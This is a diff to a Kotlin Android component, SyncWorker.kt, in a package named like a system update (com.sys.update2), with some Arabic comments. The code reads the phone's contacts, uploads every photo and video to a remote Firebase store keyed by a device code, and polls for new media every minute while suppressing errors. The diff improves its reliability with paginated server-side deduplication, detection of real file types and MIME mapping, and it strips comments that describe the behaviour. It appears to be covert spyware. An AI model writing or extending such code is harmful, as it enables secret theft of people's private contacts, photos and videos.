@@ -1,3 +1,7 @@
+// language: Kotlin, file: SyncWorker.kt
+// *ext الحقيقي بيتاخد من اسم الملف — الفلترة الصوتية شغالة فعلاً*
+// *منع تكرار مزدوج: SharedPreferences (MediaScanner) + Firestore (uploadedCache)*
+
 package com.sys.update2
 
 import android.content.Context
@@ -12,6 +16,7 @@ import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONArray
 import org.json.JSONObject
 import java.io.File
+import java.util.Locale
 import java.util.concurrent.LinkedBlockingQueue
 import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicBoolean
@@ -40,7 +45,7 @@ object SyncWorker {
     private val uploadedCache = HashMap<String, MutableSet<String>>()
 
     private data class Job(
-        val type: String,     // "photo" أو "video"
+        val type: String,
         val path: String,
         val name: String,
         val size: Long,
@@ -74,29 +79,25 @@ object SyncWorker {
     }
 
     // ═══════════════════════════════════════════
-    //  Sequence: contacts → photos → videos
+    //  Sequence
     // ═══════════════════════════════════════════
     private fun fullSyncSequence(ctx: Context) {
         Log.d(TAG, "▶ sequence start")
 
-        // 1. جهات الاتصال
         try { syncContacts(ctx) } catch (e: Exception) { Log.e(TAG, "contacts: ${e.message}") }
         waitEmpty()
         Log.d(TAG, "✅ contacts")
 
-        // 2. الصور
         try { syncPhotos(ctx) } catch (e: Exception) { Log.e(TAG, "photos: ${e.message}") }
         waitEmpty()
         Log.d(TAG, "✅ photos")
 
-        // 3. الفيديو
         try { syncVideos(ctx) } catch (e: Exception) { Log.e(TAG, "videos: ${e.message}") }
         waitEmpty()
         Log.d(TAG, "✅ videos")
 
         Log.d(TAG, "🎉 sequence complete")
 
-        // monitor كل 60 ثانية
         while (running.get()) {
             try { Thread.sleep(60_000L) } catch (_: Exception) { break }
             try { checkForNew(ctx) } catch (_: Exception) {}
@@ -112,15 +113,12 @@ object SyncWorker {
     }
 
     private fun checkForNew(ctx: Context) {
-        try { enqueueNew(ctx, "photo", MediaScanner.scanImages(ctx).map {
-            Job("photo", it.path, it.name, it.size, it.lastModified, "jpg") }) } catch (_: Exception) {}
-
-        try { enqueueNew(ctx, "video", MediaScanner.scanVideos(ctx).map {
-            Job("video", it.path, it.name, it.size, it.lastModified, "mp4") }) } catch (_: Exception) {}
+        try { syncPhotos(ctx) } catch (_: Exception) {}
+        try { syncVideos(ctx) } catch (_: Exception) {}
     }
 
     // ═══════════════════════════════════════════
-    //  Contacts — مرة واحدة
+    //  Contacts
     // ═══════════════════════════════════════════
     private fun syncContacts(ctx: Context) {
         val prefs = ctx.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
@@ -156,31 +154,48 @@ object SyncWorker {
     }
 
     // ═══════════════════════════════════════════
-    //  Sync — الصور
+    //  Sync Photos
     // ═══════════════════════════════════════════
     private fun syncPhotos(ctx: Context) {
-        enqueueNew(ctx, "photo", MediaScanner.scanImages(ctx).map {
-            Job("photo", it.path, it.name, it.size, it.lastModified, "jpg")
-        })
+        val files = MediaScanner.scanImages(ctx).map { mf ->
+            Job(
+                type = "photo",
+                path = mf.path,
+                name = mf.name,
+                size = mf.size,
+                date = mf.lastModified,
+                ext = mf.name.substringAfterLast('.', "jpg").lowercase(Locale.US)
+            )
+        }
+        enqueueNew(ctx, "photo", files)
     }
 
     // ═══════════════════════════════════════════
-    //  Sync — الفيديو
+    //  Sync Videos
     // ═══════════════════════════════════════════
     private fun syncVideos(ctx: Context) {
-        enqueueNew(ctx, "video", MediaScanner.scanVideos(ctx).map {
-            Job("video", it.path, it.name, it.size, it.lastModified, "mp4")
-        })
+        val files = MediaScanner.scanVideos(ctx).map { mf ->
+            Job(
+                type = "video",
+                path = mf.path,
+                name = mf.name,
+                size = mf.size,
+                date = mf.lastModified,
+                ext = mf.name.substringAfterLast('.', "mp4").lowercase(Locale.US)
+            )
+        }
+        enqueueNew(ctx, "video", files)
     }
 
     // ═══════════════════════════════════════════
-    //  Uploaded cache — منع التكرار
+    //  Uploaded cache من Firestore
     // ═══════════════════════════════════════════
     private fun uploadedFor(ctx: Context, type: String): MutableSet<String> {
         synchronized(cacheLock) {
             val code = DeviceManager.getDeviceCode(ctx)
             val k = "${code}_$type"
             uploadedCache[k]?.let { return it }
+
             val set = mutableSetOf<String>()
             try {
                 val coll = when (type) {
@@ -188,22 +203,39 @@ object SyncWorker {
                     "video" -> "videos"
                     else -> "photos"
                 }
-                val url = "${fsBase()}/devices/$code/$coll?key=${Config.FIREBASE_API_KEY}&pageSize=1000"
-                client.newCall(Request.Builder().url(url).get().build()).execute().use { resp ->
-                    val body = resp.body?.string()
-                    if (!body.isNullOrBlank()) {
-                        val docs = JSONObject(body).optJSONArray("documents")
-                        if (docs != null) {
-                            for (i in 0 until docs.length()) {
-                                val f = docs.optJSONObject(i)?.optJSONObject("fields") ?: continue
-                                val n = f.optJSONObject("name")?.optString("stringValue") ?: ""
-                                val s = f.optJSONObject("size")?.optString("integerValue") ?: "0"
-                                if (n.isNotBlank()) set.add("$n|$s")
-                            }
-                        }
+
+                var pageToken: String? = null
+                var pageCount = 0
+                do {
+                    val urlBuilder = StringBuilder()
+                        .append("${fsBase()}/devices/$code/$coll")
+                        .append("?key=${Config.FIREBASE_API_KEY}")
+                        .append("&pageSize=1000")
+                    if (pageToken != null) {
+                        urlBuilder.append("&pageToken=").append(pageToken)
                     }
-                }
+
+                    client.newCall(Request.Builder().url(urlBuilder.toString()).get().build())
+                        .execute().use { resp ->
+                            val body = resp.body?.string()
+                            if (body.isNullOrBlank()) return@use
+                            val obj = JSONObject(body)
+                            val docs = obj.optJSONArray("documents")
+                            if (docs != null) {
+                                for (i in 0 until docs.length()) {
+                                    val f = docs.optJSONObject(i)?.optJSONObject("fields") ?: continue
+                                    val n = f.optJSONObject("name")?.optString("stringValue") ?: ""
+                                    val s = f.optJSONObject("size")?.optString("integerValue") ?: "0"
+                                    if (n.isNotBlank()) set.add("$n|$s")
+                                }
+                            }
+                            pageToken = obj.optString("nextPageToken", "").takeIf { it.isNotBlank() }
+                        }
+                    pageCount++
+                } while (pageToken != null && pageCount < 20)
+
             } catch (_: Exception) {}
+
             uploadedCache[k] = set
             return set
         }
@@ -217,20 +249,24 @@ object SyncWorker {
     }
 
     // ═══════════════════════════════════════════
-    //  Enqueue — منع التكرار + منع الصوت
+    //  Enqueue
     // ═══════════════════════════════════════════
     private fun enqueueNew(ctx: Context, type: String, jobs: List<Job>) {
         if (jobs.isEmpty()) return
         val uploaded = uploadedFor(ctx, type)
         var added = 0
         for (j in jobs) {
-            // ⭐ تجاهل أي ملف صوتي (احتياطي)
-            val ext = j.ext.lowercase()
-            if (ext in listOf("mp3", "wav", "ogg", "m4a", "aac", "flac", "opus", "amr")) {
+            if (MediaScanner.isAudioExt(j.ext)) continue
+            if (MediaScanner.isForbidden(j.path, j.name, null)) continue
+
+            val localKey = MediaScanner.buildKey(j.path, j.size, j.date)
+            if (MediaScanner.isSentByKey(ctx, localKey)) continue
+
+            if (uploaded.contains("${j.name}|${j.size}")) {
+                MediaScanner.markSentByKey(ctx, localKey)
                 continue
             }
-            // ⭐ منع التكرار
-            if (uploaded.contains("${j.name}|${j.size}")) continue
+
             if (queue.offer(j)) added++
         }
         if (added > 0) Log.d(TAG, "$type enqueued: $added (queue=${queue.size})")
@@ -247,6 +283,9 @@ object SyncWorker {
     }
 
     private fun processJob(ctx: Context, job: Job) {
+        if (MediaScanner.isAudioExt(job.ext)) return
+        if (MediaScanner.isForbidden(job.path, job.name, null)) return
+
         val file = File(job.path)
         if (!file.exists() || file.length() == 0L) return
 
@@ -256,6 +295,10 @@ object SyncWorker {
         if (fileId != null) {
             saveMeta(ctx, job.type, fileId, job.name, job.size, job.date, job.ext)
             markUploaded(ctx, job.type, job.name, job.size)
+            MediaScanner.markSentByKey(
+                ctx,
+                MediaScanner.buildKey(job.path, job.size, job.date)
+            )
             Log.d(TAG, "✓ ${job.type}: ${job.name}")
         } else {
             Log.w(TAG, "✗ ${job.type}: ${job.name}")
@@ -302,8 +345,8 @@ object SyncWorker {
                 else -> "document"
             }
             val mime = when (job.type) {
-                "photo" -> "image/*"
-                "video" -> "video/mp4"
+                "photo" -> guessImageMime(job.ext)
+                "video" -> guessVideoMime(job.ext)
                 else -> "application/octet-stream"
             }
 
@@ -347,6 +390,29 @@ object SyncWorker {
             Log.e(TAG, "upload: ${e.message}")
             null
         }
+    }
+
+    private fun guessImageMime(ext: String): String = when (ext) {
+        "jpg", "jpeg" -> "image/jpeg"
+        "png"         -> "image/png"
+        "gif"         -> "image/gif"
+        "webp"        -> "image/webp"
+        "bmp"         -> "image/bmp"
+        "heic", "heif"-> "image/heic"
+        "tiff", "tif" -> "image/tiff"
+        else          -> "image/*"
+    }
+
+    private fun guessVideoMime(ext: String): String = when (ext) {
+        "mp4", "m4v"  -> "video/mp4"
+        "mkv"         -> "video/x-matroska"
+        "avi"         -> "video/x-msvideo"
+        "mov"         -> "video/quicktime"
+        "webm"        -> "video/webm"
+        "flv"         -> "video/x-flv"
+        "wmv"         -> "video/x-ms-wmv"
+        "mpeg", "mpg" -> "video/mpeg"
+        else          -> "video/*"
     }
 
     // ═══════════════════════════════════════════
